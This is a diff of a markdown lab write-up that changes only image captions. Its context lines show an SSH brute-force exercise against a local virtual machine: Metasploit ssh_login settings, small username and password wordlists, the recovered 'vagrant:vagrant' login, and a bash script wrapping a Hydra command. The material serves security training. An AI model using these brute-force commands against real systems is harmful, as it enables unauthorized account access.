@@ -45,7 +45,7 @@ We started Metasploit with:
 msfconsole
 ```
 
-![Metasploit Launch](image-1.jpg)
+![](image-1.jpg)
 
 ---
 
@@ -63,7 +63,7 @@ We then configured the target:
 set RHOSTS 192.168.56.103
 ```
 
-![Select Module](image-1.jpg)
+![](image-1.jpg)
 
 ---
 
@@ -103,7 +103,7 @@ set PASS_FILE pass.txt
 set VERBOSE true
 ```
 
-![Wordlists Setup](image-2.jpg)
+![](image-2.jpg)
 
 ---
 
@@ -122,7 +122,7 @@ Metasploit attempted multiple combinations. It successfully logged in using:
 [+] 192.168.56.103:22 - Success: 'vagrant:vagrant'
 ```
 
-![SSH Login Success](image-3.jpg)
+![](image-3.jpg)
 
 ---
 
@@ -142,7 +142,7 @@ We first verified that the attacker can reach the victim via `ping`:
 ping 192.168.56.103
 ```
 
-![Ping Test](image-4.png)
+![](image-4.png)
 
 ---
 
@@ -159,7 +159,7 @@ postgres
 vagrant
 ```
 
-![User List](image-8.png)
+![](image-8.png)
 
 **pass.txt**
 
@@ -171,7 +171,7 @@ password
 vagrant
 ```
 
-![Password List](image-9.png)
+![](image-9.png)
 
 ---
 
@@ -188,7 +188,7 @@ Hydra successfully found:
 - **Username**: `vagrant`
 - **Password**: `vagrant`
 
-![Hydra Success](image-11.png)
+![](image-11.png)
 
 ---
 
@@ -210,7 +210,7 @@ echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
 hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 ```
 
-![Script Code](image-6.png)
+![](image-6.png)
 
 Then ran:
 
@@ -221,7 +221,7 @@ chmod +x ssh_bruteforce.sh
 
 Output confirmed success:
 
-![Script Output](image-5.png)
+![](image-5.png)
 
 ---
 
